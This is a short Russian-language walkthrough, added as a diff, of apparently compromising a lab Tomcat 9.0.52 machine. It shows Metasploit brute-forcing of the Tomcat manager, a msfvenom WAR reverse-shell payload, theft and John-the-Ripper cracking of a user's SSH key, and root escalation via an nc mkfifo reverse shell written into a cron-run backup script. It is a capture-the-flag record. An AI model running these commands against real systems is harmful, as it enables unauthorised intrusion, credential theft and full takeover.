@@ -1,0 +1,31 @@
+Tomcat 9.0.52
+я искала эксплойты, но не нашла
+пришлось воспользовать msf6, для брутфорса
+
+    use auxiliary/scanner/http/tomcat_mgr_login
+        set rhosts 192.168.100.32
+        set lhost 192.168.100.4
+        set verbose false       не показывать неудачные попытки
+    
+    tomcat:role1
+
+    есть данные для входа
+
+далле есть возможность загрузить war файл, в инете искала возможность создать shell файл с расширением war
+    msfvenom -p java/shell_reverse_tcp lhost=192.168.100.4 lport=1234 -f war -o pwn.war
+
+после загрузки файла,я стала www-data
+после того, как зашла в /home увидела пользователя thales
+в нем была папка .ssh, с id_rsa, скопировала и вставила в свой файл
+    chmod 600 auth
+    python3 /root/Videos/john/run/ssh2john.py /root/auth > /root/id_rsa.hash
+    john id_rsa.hash --wordlist=/root/Downloads/rockyou.txt
+        vodka06          (/root/auth)
+это пароль от пользователя thales, стала им, и в notes.txt увидела подсказку для повышения привеллегий /usr/local/bin/backup.sh
+этот файл, который запускается самостоятельно через некоторое время
+ввожу в него команду, которая предоставляет удаленный доступ
+    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.4 9999 >/tmp/f'>/usr/local/bin/backup.sh
+    <on_my_own_comp> rlwrap nc -nlvp 9999
+
+и через некоторое время я стала root
+
